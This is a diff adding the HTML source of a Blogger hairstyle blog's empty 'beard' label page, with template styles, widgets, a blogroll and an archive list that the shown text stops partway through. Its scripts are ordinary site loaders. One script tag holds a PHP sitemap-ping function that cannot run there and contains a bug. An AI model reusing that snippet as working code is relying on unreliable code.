@@ -1,0 +1,4614 @@
+<!DOCTYPE html>
+<html dir='ltr' xmlns='http://www.w3.org/1999/xhtml' xmlns:b='http://www.google.com/2005/gml/b' xmlns:data='http://www.google.com/2005/gml/data' xmlns:expr='http://www.google.com/2005/gml/expr'>
+<head>
+<link href='https://www.blogger.com/static/v1/widgets/204402360-widget_css_bundle.css' rel='stylesheet' type='text/css'/>
+<meta content='yn7e6a4rHshzrRHAPygvwBD6LxYeHb1AsGZNoORLmZk' name='google-site-verification'/>
+<meta content='text/html; charset=UTF-8' http-equiv='Content-Type'/>
+<meta content='blogger' name='generator'/>
+<link href='http://mediumhairstylefashion.blogspot.com/favicon.ico' rel='icon' type='image/x-icon'/>
+<link href='http://mediumhairstylefashion.blogspot.com/search/label/beard' rel='canonical'/>
+<link rel="alternate" type="application/atom+xml" title="Medium Hairstyle Fashions - Atom" href="http://mediumhairstylefashion.blogspot.com/feeds/posts/default" />
+<link rel="alternate" type="application/rss+xml" title="Medium Hairstyle Fashions - RSS" href="http://mediumhairstylefashion.blogspot.com/feeds/posts/default?alt=rss" />
+<link rel="service.post" type="application/atom+xml" title="Medium Hairstyle Fashions - Atom" href="https://www.blogger.com/feeds/5646024447793338073/posts/default" />
+<link rel="me" href="https://www.blogger.com/profile/07136070062811699855" />
+<!--Can't find substitution for tag [blog.ieCssRetrofitLinks]-->
+<meta content='http://mediumhairstylefashion.blogspot.com/search/label/beard' property='og:url'/>
+<meta content='Medium Hairstyle Fashions' property='og:title'/>
+<meta content='' property='og:description'/>
+<!--[if IE]> <script> (function() { var html5 = ("abbr,article,aside,audio,canvas,datalist,details," + "figure,footer,header,hgroup,mark,menu,meter,nav,output," + "progress,section,time,video").split(','); for (var i = 0; i < html5.length; i++) { document.createElement(html5[i]); } try { document.execCommand('BackgroundImageCache', false, true); } catch(e) {} })(); </script> <![endif]-->
+<title>Medium Hairstyle Fashions</title>
+<script charset='utf-8' src='http://ajax.googleapis.com/ajax/libs/jquery/1.3.2/jquery.min.js' type='text/javascript'></script>
+<script src='http://cuerosb.googlecode.com/files/cueros%20-lazyload.js' type='text/javascript'></script>
+<script charset='utf-8' type='text/javascript'>
+$(function() {
+$("img").lazyload({placeholder :
+"https://lh5.googleusercontent.com/_u4rBCfM4eII/TXksAi6R_OI/AAAAAAAABZY/2k63Mrtswf0/grey.
+",threshold
+: 200});
+});
+</script>
+<script src='//ajax.googleapis.com/ajax/libs/jquery/1.6.2/jquery.min.js' type='text/javascript'></script>
+<link href='//icons.iconarchive.com/icons/mazenl77/I-like-buttons-3a/32/Cute-Ball-Favorites-icon.png' rel='shotcut icon'/>
+<style id='page-skin-1' type='text/css'><!--
+/*
+-----------------------------------------------
+Blogger Template Style
+Name   :Denim Style 1.6.2
+-----------------------------------------------
+*/
+#navbar-iframe {
+height:0px;
+visibility:hidden;
+display:none
+}
+/* Variable definitions
+====================
+<Variable name="bgColor" description="Page Background Color"
+type="color" default="#efefef">
+<Variable name="textColor" description="Text Color"
+type="color" default="#333333">
+<Variable name="linkColor" description="Link Color"
+type="color" default="#336699">
+<Variable name="headerBgColor" description="Page Header Background Color"
+type="color" default="#336699">
+<Variable name="headerTextColor" description="Page Header Text Color"
+type="color" default="#ffffff">
+<Variable name="headerCornersColor" description="Page Header Corners Color"
+type="color" default="#528bc5">
+<Variable name="mainBgColor" description="Main Background Color"
+type="color" default="#ffffff">
+<Variable name="borderColor" description="Border Color"
+type="color" default="#cccccc">
+<Variable name="dateHeaderColor" description="Date Header Color"
+type="color" default="#999999">
+<Variable name="sidebarTitleBgColor" description="Sidebar Title Background Color"
+type="color" default="#ffd595">
+<Variable name="sidebarTitleTextColor" description="Sidebar Title Text Color"
+type="color" default="#333333">
+<Variable name="bodyFont" description="Text Font"
+type="font" default="normal normal 100% Verdana, Arial, Sans-serif;">
+<Variable name="headerFont" description="Page Header Font"
+type="font" default="normal normal 210% Verdana, Arial, Sans-serif;">
+<Variable name="startSide" description="Start side in blog language"
+type="automatic" default="left">
+<Variable name="endSide" description="End side in blog language"
+type="automatic" default="right">
+*/
+body {
+background: #efefef;
+margin: 0;
+padding: 0px;
+font: x-small Verdana, Arial;
+text-align: center;
+color: #333333;
+font-size/* */:/**/small;
+font-size: /**/small;
+}
+a:link {
+color: #336699;
+}
+a:visited {
+color: #336699;
+}
+a img {
+border-width: 0;
+}
+#outer-wrapper {
+font: normal normal 100% Verdana, Arial, Sans-serif;;
+}
+/* Header
+----------------------------------------------- */
+#header-wrapper {
+margin:0;
+padding: 0;
+background-color: #efefef;
+text-align: left;
+}
+#header {
+width: 760px;
+margin: 0 auto;
+background-color: #777777;
+border: 1px solid #777777;
+color: #ffffff;
+padding: 0;
+font: normal normal 210% Verdana, Arial, Sans-serif;;
+}
+h1.title {
+padding-top: 20px;
+margin: 0 14px .1em;
+line-height: 30px;
+font-size: 100%;
+}
+h1.title a, h1.title a:visited {
+color: #ffffff;
+text-decoration: none;
+}
+#header .description {
+display: block;
+margin: 0 14px;
+padding: 10px;
+line-height: 1.4em;
+font-size: 50%;
+}
+/* Content
+----------------------------------------------- */
+.clear {
+clear: both;
+}
+#content-wrapper {
+width: 760px;
+margin: 0 auto;
+padding: 0 0 15px;
+text-align: left;
+background-color: #ffffff;
+border: 1px solid #cccccc;
+border-top: 0;
+}
+#main-wrapper {
+margin-left: 14px;
+width: 464px;
+float: left;
+background-color: #ffffff;
+display: inline;       /* fix for doubling margin in IE */
+word-wrap: break-word; /* fix for long text breaking sidebar float in IE */
+overflow: hidden;      /* fix for long non-text content breaking IE sidebar float */
+}
+#sidebar-wrapper {
+margin-right: 14px;
+width: 240px;
+float: right;
+background-color: #ffffff;
+display: inline;       /* fix for doubling margin in IE */
+word-wrap: break-word; /* fix for long text breaking sidebar float in IE */
+overflow: hidden;      /* fix for long non-text content breaking IE sidebar float */
+}
+/* Headings
+----------------------------------------------- */
+h2, h3 {
+margin: 0;
+}
+/* Posts
+----------------------------------------------- */
+.date-header {
+margin: 1.5em 0 0;
+font-weight: normal;
+color: #999999;
+font-size: 100%;
+}
+.post {
+margin: 0 0 1.5em;
+padding-bottom: 1.5em;
+}
+.post-title {
+margin: 0;
+padding: 0;
+font-size: 125%;
+font-weight: bold;
+line-height: 1.1em;
+}
+.post-title a, .post-title a:visited, .post-title strong {
+text-decoration: none;
+color: #333333;
+font-weight: bold;
+}
+.post div {
+margin: 0 0 .75em;
+line-height: 1.3em;
+}
+.post-footer {
+margin: -.25em 0 0;
+color: #333333;
+font-size: 87%;
+}
+.post-footer .span {
+margin-right: .3em;
+}
+.post img {
+padding: 1px;
+max-height: 370px;
+max-width:  340px;
+}
+.tr-caption-container img {
+border: none;
+padding: 0;
+}
+.post blockquote {
+margin: 1em 20px;
+}
+.post blockquote p {
+margin: .75em 0;
+}
+/* Comments
+----------------------------------------------- */
+#comments h4 {
+margin: 1em 0;
+color: #999999;
+}
+#comments h4 strong {
+font-size: 110%;
+}
+#comments-block {
+margin: 1em 0 1.5em;
+line-height: 1.3em;
+}
+#comments-block dt {
+margin: .5em 0;
+}
+#comments-block dd {
+margin: .25em 0 0;
+}
+#comments-block dd.comment-footer {
+margin: -.25em 0 2em;
+line-height: 1.4em;
+font-size: 78%;
+}
+#comments-block dd p {
+margin: 0 0 .75em;
+}
+.deleted-comment {
+font-style:italic;
+color:gray;
+}
+.feed-links {
+clear: both;
+line-height: 2.5em;
+}
+#blog-pager-newer-link {
+float: left;
+}
+#blog-pager-older-link {
+float: right;
+}
+#blog-pager {
+text-align: center;
+}
+/* Sidebar Content
+----------------------------------------------- */
+.sidebar h2 {
+margin: 1.6em 0 .5em;
+padding: 4px 5px;
+background-color: #777777;
+font-size: 100%;
+color: #ffffff;
+}
+.sidebar ul {
+margin: 0;
+padding: 0;
+list-style: none;
+}
+.sidebar li {
+margin: 0;
+padding-top: 0;
+padding-right: 0;
+padding-bottom: .5em;
+padding-left: 15px;
+text-indent: -15px;
+line-height: 1.5em;
+}
+.sidebar {
+color: #333333;
+line-height:1.3em;
+}
+.sidebar .widget {
+margin-bottom: 1em;
+}
+.sidebar .widget-content {
+margin: 0 5px;
+}
+/* Profile
+----------------------------------------------- */
+.profile-img {
+float: left;
+margin-top: 0;
+margin-right: 5px;
+margin-bottom: 5px;
+margin-left: 0;
+padding: 4px;
+border: 1px solid #cccccc;
+}
+.profile-data {
+margin:0;
+text-transform:uppercase;
+letter-spacing:.1em;
+font-weight: bold;
+line-height: 1.6em;
+font-size: 78%;
+}
+.profile-datablock {
+margin:.5em 0 .5em;
+}
+.profile-textblock {
+margin: 0.5em 0;
+line-height: 1.6em;
+}
+/* Footer
+----------------------------------------------- */
+#footer {
+clear: both;
+text-align: center;
+color: #333333;
+}
+#footer .widget {
+margin:.5em;
+padding-top: 20px;
+font-size: 85%;
+line-height: 1.5em;
+text-align: left;
+}
+#Label1 .widget-content{
+height:300px;
+width:auto;
+overflow:auto;
+}
+
+--></style>
+<!--Related Posts with thumbnails Scripts and Styles Start-->
+<!--Related Posts with thumbnails Scripts and Styles End-->
+<script>
+// returns false when input invalid, returns a number (array index) when url is invalid or // request fails, returns true when complete:
+
+function suSubmitSitemap( $sXmlUrl, $asSearchEnginePingUrl = 'http://www.google.com/ping?sitemap=%s', $bContinueOnError = false ) 
+{
+  if( !suIsValidString( $sXmlUrl ) || ( !suIsValidString( $asSearchEnginePingUrl ) && !suIsValidArray( $asSearchEnginePingUrl )))
+   { return false; }
+
+  $a = (is_array($asSearchEnginePingUrl))?$asSearchEnginePingUrl:explode(',', $asSearchEnginePingUrl );
+  $sXmlUrl = urlencode( $sXmlUrl );
+
+  $ret = false;
+  foreach( $a as $i=>$sUrl )
+  {
+    $sUri = str_replace( '%s', $sXmlUrl, $sUrl );
+    $bValid = (!is_bool( strpos( $sUrl, '%s' )) && suGetUrlContent( $sUri ));
+    if( !$bValid )
+     { 
+       if( !$bContinueOnError )
+        { return $i; }
+       if( !is_array( $ret ))
+        { $ret = array(); }
+
+       $ret[$i] = $sUri;
+     }
+  }
+  return ret;
+}
+</script>
+<script type='text/javascript'>
+var blog = document.location.hostname;
+var slug = document.location.pathname;
+var ctld = blog.substr(blog.lastIndexOf("."));
+if (ctld != ".com") {
+var ncr = "http://" + blog.substr(0, blog.indexOf("."));
+ncr += ".blogspot.com/ncr" + slug;
+window.location.replace(ncr); }
+</script>
+<link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=5646024447793338073&amp;zx=86b7083e-9299-4e41-a906-a88505bf92d8' media='none' onload='if(media!=&#39;all&#39;)media=&#39;all&#39;' rel='stylesheet'/><noscript><link href='https://www.blogger.com/dyn-css/authorization.css?targetBlogID=5646024447793338073&amp;zx=86b7083e-9299-4e41-a906-a88505bf92d8' rel='stylesheet'/></noscript>
+
+</head>
+<body>
+<div class='navbar section' id='navbar'><div class='widget Navbar' data-version='1' id='Navbar1'><script type="text/javascript">
+    function setAttributeOnload(object, attribute, val) {
+      if(window.addEventListener) {
+        window.addEventListener('load',
+          function(){ object[attribute] = val; }, false);
+      } else {
+        window.attachEvent('onload', function(){ object[attribute] = val; });
+      }
+    }
+  </script>
+<div id="navbar-iframe-container"></div>
+<script type="text/javascript" src="https://apis.google.com/js/plusone.js"></script>
+<script type="text/javascript">
+      gapi.load("gapi.iframes:gapi.iframes.style.bubble", function() {
+        if (gapi.iframes && gapi.iframes.getContext) {
+          gapi.iframes.getContext().openChild({
+              url: 'https://www.blogger.com/navbar.g?targetBlogID\x3d5646024447793338073\x26blogName\x3dMedium+Hairstyle+Fashions\x26publishMode\x3dPUBLISH_MODE_BLOGSPOT\x26navbarType\x3dLIGHT\x26layoutType\x3dLAYOUTS\x26searchRoot\x3dhttps://mediumhairstylefashion.blogspot.com/search\x26blogLocale\x3den\x26v\x3d2\x26homepageUrl\x3dhttp://mediumhairstylefashion.blogspot.com/\x26vt\x3d7973779139904113554',
+              where: document.getElementById("navbar-iframe-container"),
+              id: "navbar-iframe"
+          });
+        }
+      });
+    </script><script type="text/javascript">
+(function() {
+var script = document.createElement('script');
+script.type = 'text/javascript';
+script.src = '//pagead2.googlesyndication.com/pagead/js/google_top_exp.js';
+var head = document.getElementsByTagName('head')[0];
+if (head) {
+head.appendChild(script);
+}})();
+</script>
+</div></div>
+<div id='outer-wrapper'><div id='wrap2'>
+<!-- skip links for text browsers -->
+<span id='skiplinks' style='display:none;'>
+<a href='#main'>skip to main </a> |
+      <a href='#sidebar'>skip to sidebar</a>
+</span>
+<div id='header-wrapper'>
+<div class='header section' id='header'><div class='widget Header' data-version='1' id='Header1'>
+<div id='header-inner'>
+<div class='titlewrapper'>
+<h1 class='title'>
+<a href='http://mediumhairstylefashion.blogspot.com/'>
+Medium Hairstyle Fashions
+</a>
+</h1>
+</div>
+<div class='descriptionwrapper'>
+<p class='description'><span>
+</span></p>
+</div>
+</div>
+</div></div>
+</div>
+<div id='content-wrapper'>
+<div id='crosscol-wrapper' style='text-align:center'>
+<div class='crosscol no-items section' id='crosscol'>
+</div>
+</div>
+<div id='main-wrapper'>
+<div class='main section' id='main'>
+<div class='widget Blog' data-version='1' id='Blog1'>
+<div class='blog-posts hfeed'>
+<div class='status-msg-wrap'>
+<div class='status-msg-body'>
+No posts with label <b>beard</b>. <a href="http://mediumhairstylefashion.blogspot.com/">Show all posts</a>
+</div>
+<div class='status-msg-border'>
+<div class='status-msg-bg'>
+<div class='status-msg-hidden'>No posts with label <b>beard</b>. <a href="http://mediumhairstylefashion.blogspot.com/">Show all posts</a></div>
+</div>
+</div>
+</div>
+<div style='clear: both;'></div>
+</div>
+<div class='blog-pager' id='blog-pager'>
+<a class='home-link' href='http://mediumhairstylefashion.blogspot.com/'>Home</a>
+</div>
+<div class='clear'></div>
+<div class='blog-feeds'>
+<div class='feed-links'>
+Subscribe to:
+<a class='feed-link' href='http://mediumhairstylefashion.blogspot.com/feeds/posts/default' target='_blank' type='application/atom+xml'>Posts (Atom)</a>
+</div>
+</div>
+</div></div>
+</div>
+<div id='sidebar-wrapper'>
+<div class='sidebar section' id='sidebar'>
+<div class='widget PopularPosts' data-version='1' id='PopularPosts1'>
+<h2>Popular Posts</h2>
+<div class='widget-content popular-posts'>
+<ul>
+<li>
+<div class='item-content'>
+<div class='item-thumbnail'>
+<a href='http://mediumhairstylefashion.blogspot.com/2013/11/layered-hairstyles.html' target='_blank'>
+<img alt='' border='0' src='http://2.bp.blogspot.com/-y4dH08H1vFM/UH6umrUgmkI/AAAAAAAAAMg/yayPBeAI_yM/w72-h72-p-k-no-nu/Short%2BLayered%2BHairstyles%2B1.jpg'/>
+</a>
+</div>
+<div class='item-title'><a href='http://mediumhairstylefashion.blogspot.com/2013/11/layered-hairstyles.html'>Layered Hairstyles</a></div>
+<div class='item-snippet'>Layered hairstyles are among the best hairstyles and look good on almost all types of hair lengths. It is considered to be the simplest addi...</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+<li>
+<div class='item-content'>
+<div class='item-thumbnail'>
+<a href='http://mediumhairstylefashion.blogspot.com/2013/03/fun-hairstyles-for-long-hair.html' target='_blank'>
+<img alt='' border='0' src='http://3.bp.blogspot.com/-25-_PGy20Lc/UUpmztqijOI/AAAAAAAABfQ/2jfTcXQuN3M/w72-h72-p-k-no-nu/fun-hairstyles-for-long-hair+%281%29.jpg'/>
+</a>
+</div>
+<div class='item-title'><a href='http://mediumhairstylefashion.blogspot.com/2013/03/fun-hairstyles-for-long-hair.html'>fun hairstyles for long hair</a></div>
+<div class='item-snippet'>Braided hairstyles are fun and easy to do even celebrities love them here s one of my favorite braided updos for long hair . Hairstyles for ...</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+<li>
+<div class='item-content'>
+<div class='item-thumbnail'>
+<a href='http://mediumhairstylefashion.blogspot.com/2012/07/modern-hairstyles-for-over-40-years-old.html' target='_blank'>
+<img alt='' border='0' src='http://2.bp.blogspot.com/-o81zORQeetA/UAE8nYTTe-I/AAAAAAAAAoI/N0ks5v6SHr8/w72-h72-p-k-no-nu/Hairstyles+for+over+40+years+Old+Woman+26.jpg'/>
+</a>
+</div>
+<div class='item-title'><a href='http://mediumhairstylefashion.blogspot.com/2012/07/modern-hairstyles-for-over-40-years-old.html'>Modern hairstyles for over 40 years Old Woman</a></div>
+<div class='item-snippet'>Hairstyles for over 40 years Old Woman Modern hairstyles for over 40 years Old Woman . Then I recommend a variety of hairstyles for women ov...</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+<li>
+<div class='item-content'>
+<div class='item-thumbnail'>
+<a href='http://mediumhairstylefashion.blogspot.com/2010/02/short-emo-hairstyle.html' target='_blank'>
+<img alt='' border='0' src='http://4.bp.blogspot.com/_yqQJe8VD5Ek/S22TME04XqI/AAAAAAAAArM/5RfEZtoz74g/w72-h72-p-k-no-nu/short+layered+emo+hair.jpg'/>
+</a>
+</div>
+<div class='item-title'><a href='http://mediumhairstylefashion.blogspot.com/2010/02/short-emo-hairstyle.html'>Short  emo hairstyle</a></div>
+<div class='item-snippet'>Short emo hairstyle like Adam Gontier .</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+<li>
+<div class='item-content'>
+<div class='item-thumbnail'>
+<a href='http://mediumhairstylefashion.blogspot.com/2013/09/emo-girl-hairstyle.html' target='_blank'>
+<img alt='' border='0' src='http://1.bp.blogspot.com/_55Twp5ajdGY/S_EN937-2bI/AAAAAAAAABU/969z6RYWPRc/w72-h72-p-k-no-nu/Modern%252BMedium%252BEmo%252BHairstyles%252Bfor%252BGirls%252B2010.jpg'/>
+</a>
+</div>
+<div class='item-title'><a href='http://mediumhairstylefashion.blogspot.com/2013/09/emo-girl-hairstyle.html'>emo girl hairstyle</a></div>
+<div class='item-snippet'>emo girl hairstyle emo girl hairstyle emo girl hairstyle emo girl hairstyle emo girl hairstyle emo girl hairstyle emo girl hairstyle emo gir...</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+</ul>
+<div class='clear'></div>
+</div>
+</div><div class='widget Followers' data-version='1' id='Followers1'>
+<h2 class='title'>Followers</h2>
+<div class='widget-content'>
+<div id='Followers1-wrapper'>
+<div style='margin-right:2px;'>
+<div><script type="text/javascript" src="https://apis.google.com/js/plusone.js"></script>
+<div id="followers-iframe-container"></div>
+<script type="text/javascript">
+    window.followersIframe = null;
+    function followersIframeOpen(url) {
+      gapi.load("gapi.iframes", function() {
+        if (gapi.iframes && gapi.iframes.getContext) {
+          window.followersIframe = gapi.iframes.getContext().openChild({
+            url: url,
+            where: document.getElementById("followers-iframe-container"),
+            messageHandlersFilter: gapi.iframes.CROSS_ORIGIN_IFRAMES_FILTER,
+            messageHandlers: {
+              '_ready': function(obj) {
+                window.followersIframe.getIframeEl().height = obj.height;
+              },
+              'reset': function() {
+                window.followersIframe.close();
+                followersIframeOpen("https://www.blogger.com/followers.g?blogID\x3d5646024447793338073\x26colors\x3dCgt0cmFuc3BhcmVudBILdHJhbnNwYXJlbnQaByMzMzMzMzMiByMwMDAwMDAqByNmZmZmZmYyByMwMDAwMDA6ByMzMzMzMzNCByMwMDAwMDBKByMwMDAwMDBSByNGRkZGRkZaC3RyYW5zcGFyZW50\x26pageSize\x3d21\x26origin\x3dhttp://mediumhairstylefashion.blogspot.com/");
+              },
+              'open': function(url) {
+                window.followersIframe.close();
+                followersIframeOpen(url);
+              },
+              'blogger-ping': function() {
+              }
+            }
+          });
+        }
+      });
+    }
+    followersIframeOpen("https://www.blogger.com/followers.g?blogID\x3d5646024447793338073\x26colors\x3dCgt0cmFuc3BhcmVudBILdHJhbnNwYXJlbnQaByMzMzMzMzMiByMwMDAwMDAqByNmZmZmZmYyByMwMDAwMDA6ByMzMzMzMzNCByMwMDAwMDBKByMwMDAwMDBSByNGRkZGRkZaC3RyYW5zcGFyZW50\x26pageSize\x3d21\x26origin\x3dhttp://mediumhairstylefashion.blogspot.com/");
+  </script></div>
+</div>
+</div>
+<div class='clear'></div>
+</div>
+</div><div class='widget BlogList' data-version='1' id='BlogList1'>
+<h2 class='title'>Blog Friends</h2>
+<div class='widget-content'>
+<div class='blog-list-container' id='BlogList1_container'>
+<ul id='BlogList1_blogs'>
+<li style='display: block;'>
+<div class='blog-icon'>
+<img data-lateloadsrc='https://lh6.googleusercontent.com/proxy/XwWoqqhyD27LaszjkAfYJOOArWTngjyb-f-s8SMD4kvaNEg6qXNEW3ShRJjMp3_P2OQtHWiBIPK9rxSmtdc=s0-d' height='16' width='16'/>
+</div>
+<div class='blog-content'>
+<div class='blog-title'>
+<a href='https://adamznyou.blogspot.com/' target='_blank'>
+Adamz Oseni's Blog</a>
+</div>
+<div class='item-content'>
+<div class='item-thumbnail'>
+<a href='https://adamznyou.blogspot.com/' target='_blank'>
+<img alt='' border='0' height='72' src='https://1.bp.blogspot.com/-bx5d54T_DeI/XWc2wn2XUeI/AAAAAAAAIi0/r6qKFQOykXE5hr7VQLYRftFd3WpS4PSQgCLcBGAs/s72-c/captain%2Bamerica%2B4k%2Bwallpaper%2B%2B%25284%2529.jpg' width='72'/>
+</a>
+</div>
+<span class='item-title'>
+<a href='https://adamznyou.blogspot.com/2021/08/infinity-war-captain-america-wallpaper.html' target='_blank'>
+Infinity War Captain America Wallpaper 4k
+</a>
+</span>
+
+                      -
+                    
+<span class='item-snippet'>
+ 
+
+Captain America 4k Wallpaper Download For Mobile And Pc
+
+48 Captain America Civil War Wallpapers Hd On Wallpapersafari
+
+Download 3840x2400 Wallpaper Capta...
+</span>
+<div class='item-time'>
+4 hours ago
+</div>
+</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+<li style='display: block;'>
+<div class='blog-icon'>
+<img data-lateloadsrc='https://lh3.googleusercontent.com/proxy/ajY_yKpV8I39q47gVHqnjeWk7CxcwpMhJBUlmSX5m079IhyAgQ2cHgvgcCbtTs3rRfPLZSRPPuOvZWyeq3Krlbm4AjYJ=s0-d' height='16' width='16'/>
+</div>
+<div class='blog-content'>
+<div class='blog-title'>
+<a href='http://bebrightbirthdays.blogspot.com/' target='_blank'>
+Bright Birthdays</a>
+</div>
+<div class='item-content'>
+<div class='item-thumbnail'>
+<a href='http://bebrightbirthdays.blogspot.com/' target='_blank'>
+<img alt='' border='0' height='72' src='http://4.bp.blogspot.com/_jCinsji7Ggo/TQQKYTK8m6I/AAAAAAAAGA4/JQBlao3Azt4/s72-c/Playboy%2527s%2BSexy%2BGirl%2BSara%2BJean%2BUnderwood.jpg' width='72'/>
+</a>
+</div>
+<span class='item-title'>
+<a href='http://bebrightbirthdays.blogspot.com/2015/02/sexy-playboy-nude.html' target='_blank'>
+Sexy Playboy Nude
+</a>
+</span>
+
+                      -
+                    
+<span class='item-snippet'>
+[image: Playboy's NUDE Sexy Girl Sara Jean Underwood HQ Photo Shoot 
+[DownWorLD ...]
+
+[image: Tabloid bad girl, Lindsay Lohan is supposedly posing nude for 
+...
+</span>
+<div class='item-time'>
+6 years ago
+</div>
+</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+<li style='display: block;'>
+<div class='blog-icon'>
+<img data-lateloadsrc='https://lh6.googleusercontent.com/proxy/R9mPgbmmV0XOfnCUR5xMwZBWnm1fhzZhpRNuqlaaeOchf5nYvgB5PS5z18krjoGauE8KYZqc2LbVMwZoGZTVYw=s0-d' height='16' width='16'/>
+</div>
+<div class='blog-content'>
+<div class='blog-title'>
+<a href='http://afrohaircuts.blogspot.com/' target='_blank'>
+Afro Haircuts</a>
+</div>
+<div class='item-content'>
+<div class='item-thumbnail'>
+<a href='http://afrohaircuts.blogspot.com/' target='_blank'>
+<img alt='' border='0' height='72' src='http://1.bp.blogspot.com/_NO2UOMMYKZ0/SlGcMx0iqEI/AAAAAAAAGuw/FqkE6MnCiQE/s72-c/Lauren+Conrad-5.jpg' width='72'/>
+</a>
+</div>
+<span class='item-title'>
+<a href='http://afrohaircuts.blogspot.com/2014/09/lauren-conrad-hairstyles.html' target='_blank'>
+Lauren Conrad Hairstyles
+</a>
+</span>
+
+                      -
+                    
+<span class='item-snippet'>
+Lauren Conrad, better known for her role as LC in the MTV hit-series&#8221;The 
+Hills&#8221; is a constant attention-grabber. Her fashion sense and hairstyles 
+have beco...
+</span>
+<div class='item-time'>
+6 years ago
+</div>
+</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+<li style='display: block;'>
+<div class='blog-icon'>
+<img data-lateloadsrc='https://lh4.googleusercontent.com/proxy/wXct0EYd3psSs9FykqBz6hdqd4LVbmjCIyE8hwlX-r47WHW6IdxAKi9NJPPAp6rhsxvlocG54B6W6angydDCLSeEdlveYHR5cA=s0-d' height='16' width='16'/>
+</div>
+<div class='blog-content'>
+<div class='blog-title'>
+<a href='http://thesongwriterwhosings.blogspot.com/' target='_blank'>
+The Song Writers</a>
+</div>
+<div class='item-content'>
+<div class='item-thumbnail'>
+<a href='http://thesongwriterwhosings.blogspot.com/' target='_blank'>
+<img alt='' border='0' height='72' src='http://1.bp.blogspot.com/-dA1l-4Y7iAc/Udhetv6iZdI/AAAAAAAAdJo/0nx1OIakwok/s72-c/Xray+Music+Wallpapers1.jpg' width='72'/>
+</a>
+</div>
+<span class='item-title'>
+<a href='http://thesongwriterwhosings.blogspot.com/2013/12/xray-wallpapers.html' target='_blank'>
+Xray Wallpapers
+</a>
+</span>
+
+                      -
+                    
+<span class='item-snippet'>
+Xray Wallpapers Hd Wallpapers Pc Provides High Quality in wide screen Xray 
+Wallpapers. We have selected the list of best top 18 Xray Pictures. Free 
+downloa...
+</span>
+<div class='item-time'>
+7 years ago
+</div>
+</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+<li style='display: block;'>
+<div class='blog-icon'>
+<img data-lateloadsrc='https://lh4.googleusercontent.com/proxy/kQth60sKE-jCf427l089s0o8baAWZ5AgV-czYVuAPtyY4XxoM3N5-1C_6mwOXeodAKYqdlVRvefxi5LdbfRtgJs=s0-d' height='16' width='16'/>
+</div>
+<div class='blog-content'>
+<div class='blog-title'>
+<a href='http://johnnytattooz.blogspot.com/feeds/posts/default' target='_blank'>
+Johnny Tattoos</a>
+</div>
+<div class='item-content'>
+<span class='item-title'>
+<!--Can't find substitution for tag [item.itemTitle]-->
+</span>
+
+                      -
+                    
+<span class='item-snippet'>
+<!--Can't find substitution for tag [item.itemSnippet]-->
+</span>
+<div class='item-time'>
+<!--Can't find substitution for tag [item.timePeriodSinceLastUpdate]-->
+</div>
+</div>
+</div>
+<div style='clear: both;'></div>
+</li>
+</ul>
+<div class='clear'></div>
+</div>
+</div>
+</div><div class='widget BlogArchive' data-version='1' id='BlogArchive1'>
+<h2>Blog Archive</h2>
+<div class='widget-content'>
+<div id='ArchiveList'>
+<div id='BlogArchive1_ArchiveList'>
+<ul class='hierarchy'>
+<li class='archivedate expanded'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy toggle-open'>
+
+        &#9660;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/'>
+2013
+</a>
+<span class='post-count' dir='ltr'>(372)</span>
+<ul class='hierarchy'>
+<li class='archivedate expanded'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy toggle-open'>
+
+        &#9660;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/12/'>
+December
+</a>
+<span class='post-count' dir='ltr'>(12)</span>
+<ul class='posts'>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/jennifer-aniston-long-hair-coloring.html'>Jennifer Aniston Long Hair Coloring</a></li>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/2014-long-hairstyles-for-womens.html'>2014 Long Hairstyles For Womens</a></li>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/lordy-lorde-is-pop-princess.html'>Lordy, Lorde Is A Pop Princess</a></li>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/the-perfect-red-lip.html'>The Perfect Red Lip</a></li>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/mens-cuts-toughly-tousled.html'>Men&#8217;s Cuts: Toughly Tousled</a></li>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/amanda-seyfried-glamour-waves.html'>Amanda Seyfried&#39;s Glamour Waves</a></li>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/xmas-look-inspired-by-holidays.html'>X&#8217;mas Look &#8211; Inspired by the holidays</a></li>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/pure-lattouf-has-new-product.html'>Pure Lattouf has a new Product!</a></li>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/the-perfect-look-for-perfect-day.html'>The Perfect Look for the Perfect Day</a></li>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/how-to-get-jennifer-lawrence-summer.html'>How to get Jennifer Lawrence&#39;s Summer Waves</a></li>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/princess-kate-middleton-signature-waves.html'>Princess Kate Middleton&#39;s Signature Waves</a></li>
+<li><a href='http://mediumhairstylefashion.blogspot.com/2013/12/family-friends-fans-say-goodbye-to-fast.html'>Family, Friends &amp; Fans say goodbye to Fast and Fur...</a></li>
+</ul>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
+<a class='post-count-link' href='http://mediumhairstylefashion.blogspot.com/2013/11/'>
+November
+</a>
+<span class='post-count' dir='ltr'>(51)</span>
+</li>
+</ul>
+<ul class='hierarchy'>
+<li class='archivedate collapsed'>
+<a class='toggle' href='javascript:void(0)'>
+<span class='zippy'>
+
+        &#9658;&#160;
+      
+</span>
+</a>
